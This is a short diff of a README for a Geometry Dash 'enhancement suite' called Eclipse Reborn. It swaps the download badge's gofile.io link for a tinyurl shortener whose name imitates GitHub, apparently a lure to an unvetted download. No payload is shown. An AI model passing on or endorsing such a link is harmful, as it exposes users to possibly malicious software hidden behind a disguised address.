@@ -1,7 +1,7 @@
 # 🌘 Eclipse Reborn: Ultimate Geometry Dash Enhancement Suite  
 
 <div align="center">
-  <a href="https://gofile.io/d/w9y7IJ">
+  <a href="https://tinyurl.com/githb22">
     <img src="https://img.shields.io/badge/🌑_DOWNLOAD_ECLIPSE_REBORN-6E40F9?style=for-the-badge&logo=github&logoColor=white" width="350">
   </a>
   <br><br>
